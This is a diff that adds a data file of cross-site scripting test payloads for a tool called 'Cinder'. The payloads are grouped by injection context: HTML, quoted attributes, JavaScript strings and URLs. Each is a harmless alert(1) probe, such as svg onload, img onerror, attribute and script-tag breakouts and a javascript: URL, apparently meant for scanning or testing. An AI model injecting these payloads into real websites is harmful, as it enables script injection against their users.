@@ -1,0 +1,15 @@
+# Cinder XSS payloads
+# Format: <context> | <payload>
+# Contexts: html, attr_double, attr_single, js_string, url
+# Payloads are used verbatim (do not trim trailing characters).
+
+html | <svg/onload=alert(1)>
+html | <img src=x onerror=alert(1)>
+
+attr_double | " onmouseover="alert(1)" x="
+attr_single | ' onmouseover='alert(1)' x='
+
+js_string | </script><svg/onload=alert(1)>
+js_string | ';alert(1);//
+
+url | javascript:alert(1)
